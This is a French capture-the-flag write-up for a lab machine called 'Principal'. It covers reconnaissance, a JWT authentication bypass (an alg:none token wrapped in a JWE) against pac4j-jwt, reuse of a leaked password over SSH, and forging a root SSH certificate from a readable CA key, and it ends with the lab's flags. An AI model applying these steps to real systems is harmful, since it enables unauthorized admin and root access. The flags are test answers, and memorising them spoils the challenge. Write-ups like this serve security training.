# Principal - WriteUp Complet
> **OS:** Linux | **Difficulté:** Medium | **IP:** 10.129.15.16

---

## Phase 1 - Reconnaissance & Enumération

### Pourquoi on commence par là ?
Toute attaque commence par comprendre la surface d'attaque. On veut savoir quels ports sont ouverts et quels services tournent avant de chercher des vulnérabilités.

### Scan de ports
```bash
nmap -p- --min-rate 5000 -sS 10.129.15.16
nmap -sCV -p 22,8080 10.129.15.16
```

**Résultats :**
- **Port 22** - OpenSSH
- **Port 8080** - Serveur HTTP

**Réflexion :** Seulement 2 ports. SSH sans credentials ne mène nulle part pour l'instant. On se concentre sur le port 8080 - c'est notre surface d'attaque principale.

---

## Phase 2 - Enumération Web

### Pourquoi explorer le web en détail ?
Le port 8080 héberge une application web. Avant de chercher des vulnérabilités, on doit comprendre :
- Quelles technologies sont utilisées (pour chercher des CVE connues)
- Quels endpoints existent (pour trouver des fonctionnalités cachées)
- Comment l'authentification fonctionne (pour identifier des faiblesses)

### Première visite : la page de login
```bash
curl -s http://10.129.15.16:8080/login
```

On tombe sur un formulaire de login "Principal Internal Platform". En interceptant la requête avec Burp ou en lisant le HTML, on voit que le login fait un POST vers `/api/auth/login` avec du JSON.

### Le header qui change tout
```bash
curl -sI http://10.129.15.16:8080/api/auth/login
```
```
Server: Jetty
X-Powered-By: pac4j-jwt/6.0.3
```

**Pourquoi c'est important ?** Le header `X-Powered-By` nous révèle la technologie exacte ET sa version : **pac4j-jwt 6.0.3**. C'est une information critique - on peut maintenant chercher des CVE spécifiques à cette version.

### Le reset password - impasse volontaire
```
POST /reset-password → 501 Not Implemented
{"message":"Password reset functionality is under development."}
```

**Réflexion :** Le reset ne fonctionne pas. C'est un cul-de-sac. On ne perd pas de temps dessus et on cherche ailleurs.

### Le fichier JavaScript : la mine d'or
```bash
curl -s http://10.129.15.16:8080/static/js/app.js
```

**Pourquoi lire le JS ?** Les fichiers JavaScript côté client contiennent souvent :
- Les routes de l'API (endpoints cachés)
- La logique d'authentification
- Des commentaires de développeurs avec des infos sensibles

Et ici c'est le jackpot. Le code source `app.js` nous révèle :

1. **Les endpoints de l'API :**
   - `/api/auth/jwks` - endpoint JWKS (clés publiques)
   - `/api/auth/login` - authentification
   - `/api/dashboard` - tableau de bord
   - `/api/users` - gestion des utilisateurs (admin only)
   - `/api/settings` - paramètres système (admin only)

2. **Le mécanisme d'authentification :**
   ```javascript
   // Token handling:
   // - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
   // - Public key available at /api/auth/jwks for token verification
   // - Inner JWT is signed with RS256
   ```

3. **Les rôles :** `ROLE_ADMIN`, `ROLE_MANAGER`, `ROLE_USER`

4. **Le claim schema :** `sub` (username), `role`, `iss` ("principal-platform"), `iat`, `exp`

5. **Point crucial :** La fonction `fetchJWKS()` appelle `/api/auth/jwks` **sans aucun header d'authentification** - la clé publique est accessible à tous !

**Réflexion :** On sait maintenant exactement comment les tokens sont construits (JWE wrapping un JWT signé RS256), quels claims sont attendus, et on a accès à la clé publique. C'est le schéma classique d'une attaque JWT.

### Récupération de la clé publique RSA
```bash
curl -s http://10.129.15.16:8080/api/auth/jwks
```
```json
{"keys":[{"kty":"RSA","e":"AQAB","kid":"enc-key-1","n":"lTh54vtBS1NA..."}]}
```

**On a maintenant tous les ingrédients :** la version exacte de pac4j, le format des tokens, les claims attendus, et la clé publique RSA.

---

## Phase 3 - Exploitation : CVE-2026-29000 (JWT Authentication Bypass)

### Pourquoi cette CVE ?
En cherchant "pac4j-jwt 6.0.3 CVE" on trouve **CVE-2026-29000** (CVSS 9.3 - CRITICAL).

**Versions affectées :** pac4j-jwt 6.0 à 6.3.2. Notre cible (6.0.3) est vulnérable.

### Comprendre la vulnérabilité

Pour comprendre l'exploit, il faut d'abord comprendre comment fonctionne l'authentification JWT normale sur cette app :

```
[Client] → envoie credentials → [Serveur]
[Serveur] → crée un JWT signé (RS256) → le chiffre dans un JWE (RSA-OAEP-256) → renvoie au client
[Client] → envoie le JWE comme Bearer token → [Serveur]
[Serveur] → déchiffre le JWE → vérifie la signature du JWT intérieur → autorise
```

**Le bug dans pac4j :** Quand le serveur déchiffre le JWE, il appelle `toSignedJWT()` sur le contenu intérieur pour vérifier la signature. MAIS si le contenu intérieur est un **PlainJWT** (un JWT avec `"alg": "none"` - donc sans signature), `toSignedJWT()` retourne **null**. Et quand c'est null, le code **saute entièrement le bloc de vérification de signature** au lieu de rejeter le token.

En résumé :
```
JWT normal:   JWE → [JWT signé RS256] → toSignedJWT() → vérifie signature ✓
Notre token:  JWE → [PlainJWT alg:none] → toSignedJWT() → null → SKIP vérification !
```

### L'exploitation pas à pas

**Étape 1 : Construire un PlainJWT (alg:none)**

On crée un JWT sans signature avec les claims qu'on veut :
```
Header:  {"alg": "none", "typ": "JWT"}
Payload: {"sub": "admin", "role": "ROLE_ADMIN", "iss": "principal-platform", "iat": ..., "exp": ...}
```

Le PlainJWT = `base64url(header).base64url(payload).` (pas de signature, juste un point final)

**Pourquoi ces claims ?** On les a trouvés dans `app.js`. On se fait passer pour `admin` avec le rôle `ROLE_ADMIN` pour avoir accès à tout.

**Étape 2 : Wrapper dans un JWE**

On ne peut pas envoyer le PlainJWT directement - le serveur attend un JWE. On chiffre notre PlainJWT avec la clé publique RSA récupérée via `/api/auth/jwks` :
```
Algorithme: RSA-OAEP-256 (trouvé dans app.js)
Encryption: A128GCM (trouvé dans app.js)
Content-Type: JWT (indique que le contenu est un JWT)
```

**Pourquoi ça marche ?** Le serveur peut déchiffrer le JWE car on utilise sa clé publique pour chiffrer (il a la clé privée correspondante). Le chiffrement est légitime - c'est la vérification de signature qui est bypassée.

**Étape 3 : Envoyer le token forgé**

```bash
python3 exploit_cve2026_29000.py
```

Le script :
1. Fetch la clé publique depuis `/api/auth/jwks`
2. Forge le PlainJWT avec claims admin
3. Le wrappe dans un JWE
4. L'envoie comme `Authorization: Bearer <token>`

**Résultat : STATUS 200 - ACCESS GRANTED en tant qu'admin !**

### Ce qu'on extrait en tant qu'admin

**`/api/dashboard`** - Le tableau de bord nous montre :
- L'activité récente : on voit un compte `svc-deploy` qui a des certificats SSH émis
- 8 utilisateurs dans le système

**`/api/users`** - La liste complète des utilisateurs avec emails, rôles, départements :
- `svc-deploy` : "Service account for automated deployments via SSH certificate auth" → compte de service intéressant

**`/api/settings`** - Les paramètres système. C'est ici qu'on trouve le graal :
```json
{
  "security": {
    "encryptionKey": "D3pl0y_$$H_Now42!",
    ...
  },
  "infrastructure": {
    "sshCertAuth": "enabled",
    "sshCaPath": "/opt/principal/ssh/"
  }
}
```

**Pourquoi c'est critique ?**
- `encryptionKey: D3pl0y_$$H_Now42!` → potentiel mot de passe réutilisé
- `sshCertAuth: enabled` + `sshCaPath` → l'app gère des certificats SSH, ce sera utile pour le privesc

---

## Phase 4 - User Flag : Pivot vers SSH

### Pourquoi tester ce password en SSH ?
La clé `D3pl0y_$$H_Now42!` ressemble plus à un mot de passe qu'à une vraie clé de chiffrement (pas assez d'entropie). Et on a vu que `svc-deploy` est un compte de service lié au déploiement SSH. Le réflexe : **tester le password spray sur SSH** avec tous les utilisateurs trouvés.

```bash
# On teste chaque utilisateur
sshpass -f /tmp/.sshpw ssh svc-deploy@10.129.15.16 'id'
```

**Résultat :** `svc-deploy` accepte le password !
```
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

**Observation clé :** Le user est dans le groupe `deployers`. On note ça pour plus tard.

### User Flag
```bash
cat /home/svc-deploy/user.txt
# 805571983436fcbd5c3b268cfde3d8dd
```

---

## Phase 5 - Privilege Escalation : SSH CA Key Abuse

### Pourquoi chercher vers le SSH CA ?
On a plusieurs indices qui convergent :
1. `/api/settings` nous dit que le SSH cert auth est activé, CA dans `/opt/principal/ssh/`
2. Le dashboard montre que `svc-deploy` a eu des "SSH certificate issued"
3. `svc-deploy` est dans le groupe `deployers`
4. La note du user dit "Service account for automated deployments via SSH certificate auth"

**Tout pointe vers le même endroit.** On va vérifier si on a accès aux fichiers CA.

### Exploration du répertoire SSH CA
```bash
ls -la /opt/principal/ssh/
```
```
drwxr-x--- 2 root deployers 4096 Mar 11 04:22 .
-rw-r----- 1 root deployers 3381 Mar  5 21:05 ca        ← CLÉ PRIVÉE !
-rw-r--r-- 1 root root       742 Mar  5 21:05 ca.pub    ← clé publique
-rw-r----- 1 root deployers  288 Mar  5 21:05 README.txt
```

**Pourquoi c'est game over ?**
- Le dossier appartient au groupe `deployers` → notre user `svc-deploy` est dans ce groupe
- La **clé privée CA** (`ca`) est lisible par le groupe `deployers`
- Avec la clé privée CA, on peut **signer des certificats SSH pour N'IMPORTE QUEL utilisateur**

### Vérification : est-ce que sshd fait confiance à cette CA ?
```bash
cat /etc/ssh/sshd_config.d/*.conf
```
```
TrustedUserCAKeys /opt/principal/ssh/ca.pub
PermitRootLogin prohibit-password
```

**Deux confirmations critiques :**
1. `TrustedUserCAKeys` → sshd fait confiance aux certificats signés par cette CA
2. `PermitRootLogin prohibit-password` → root peut se connecter en SSH mais UNIQUEMENT avec une clé/certificat (pas de password). Un certificat signé par la CA sera accepté !

### Forger un certificat SSH pour root

**Étape 1 : Copier la clé privée CA sur notre machine**
```bash
scp svc-deploy@10.129.15.16:/opt/principal/ssh/ca /tmp/ca_key
chmod 600 /tmp/ca_key
```

**Étape 2 : Générer une nouvelle paire de clés SSH**
```bash
ssh-keygen -t ed25519 -f /tmp/root_key -N ''
```
On crée une simple paire de clés ED25519. La clé en elle-même n'est pas importante - c'est le **certificat** signé par la CA qui donnera l'accès.

**Étape 3 : Signer notre clé publique avec la CA pour le principal "root"**
```bash
ssh-keygen -s /tmp/ca_key -I "root-cert" -n root -V +1h /tmp/root_key.pub
```
Paramètres :
- `-s /tmp/ca_key` : utilise la clé privée CA pour signer
- `-I "root-cert"` : identifiant du certificat (arbitraire)
- `-n root` : le **principal** = le nom d'utilisateur autorisé. C'est ça qui dit "ce certificat est valide pour se connecter en tant que root"
- `-V +1h` : validité d'1 heure

Cela crée `/tmp/root_key-cert.pub` - notre certificat forgé.

**Étape 4 : Connexion en root**
```bash
ssh -i /tmp/root_key root@10.129.15.16
```

Quand SSH se connecte, il envoie automatiquement le certificat (`root_key-cert.pub`) avec la clé. Le serveur :
1. Vérifie que le certificat est signé par la CA de confiance (`TrustedUserCAKeys`) → OUI
2. Vérifie que le principal "root" correspond au user demandé → OUI
3. Vérifie que le certificat n'est pas expiré → OUI
4. **Autorise la connexion** → ROOT !

### Root Flag
```bash
cat /root/root.txt
# 008970f511f940c5ddd416e392a050d7
```

---

## Kill Chain Visuel

```
                    ┌─────────────────────┐
                    │    Enumération       │
                    │  nmap → SSH + 8080   │
                    └──────────┬──────────┘
                               │
                    ┌──────────▼──────────┐
                    │   Enum Web (8080)    │
                    │ X-Powered-By:        │
                    │ pac4j-jwt/6.0.3      │
                    │ + app.js → specs JWT │
                    │ + /api/auth/jwks     │
                    └──────────┬──────────┘
                               │
                    ┌──────────▼──────────┐
                    │  CVE-2026-29000      │
                    │  Forge PlainJWT      │
                    │  (alg:none) in JWE   │
                    │  → Admin API access  │
                    └──────────┬──────────┘
                               │
                    ┌──────────▼──────────┐
                    │  /api/settings       │
                    │  Leak password:      │
                    │  D3pl0y_$$H_Now42!   │
                    └──────────┬──────────┘
                               │
                    ┌──────────▼──────────┐
                    │  SSH as svc-deploy   │
                    │  → USER FLAG         │
                    │  groupe: deployers   │
                    └──────────┬──────────┘
                               │
                    ┌──────────▼──────────┐
                    │  /opt/principal/ssh/ │
                    │  CA private key      │
                    │  lisible (deployers) │
                    └──────────┬──────────┘
                               │
                    ┌──────────▼──────────┐
                    │  Forge SSH cert      │
                    │  pour root           │
                    │  ssh -i root_key     │
                    │  → ROOT FLAG         │
                    └─────────────────────┘
```

## Leçons apprises

1. **Toujours lire les fichiers JS** - `app.js` nous a donné toute la spec d'authentification, les endpoints cachés, et les rôles. Sans ça, on aurait cherché à l'aveugle.

2. **Les headers HTTP parlent** - `X-Powered-By: pac4j-jwt/6.0.3` a directement mené à la CVE. Toujours noter les versions.

3. **Les settings API leakent souvent des secrets** - Une fois admin, explorer `/api/settings`, `/api/config`, `/admin/` etc. Les devs y mettent des infos qu'ils ne pensent pas exposées.

4. **Password reuse** - Une "encryption key" dans les settings s'est avérée être un password SSH. Toujours tester les secrets trouvés comme credentials.

5. **SSH CA = game over si la clé privée fuit** - Quand `TrustedUserCAKeys` est configuré et qu'on a la clé privée CA, on peut se connecter en tant que N'IMPORTE QUEL utilisateur, y compris root. C'est pourquoi les clés CA doivent être extrêmement protégées.

6. **Les groupes Linux sont des vecteurs de privesc** - `svc-deploy` dans le groupe `deployers` avait accès à la CA. Toujours vérifier `id` et les permissions des dossiers sensibles.

## Flags
- **User:** `805571983436fcbd5c3b268cfde3d8dd`
- **Root:** `008970f511f940c5ddd416e392a050d7`
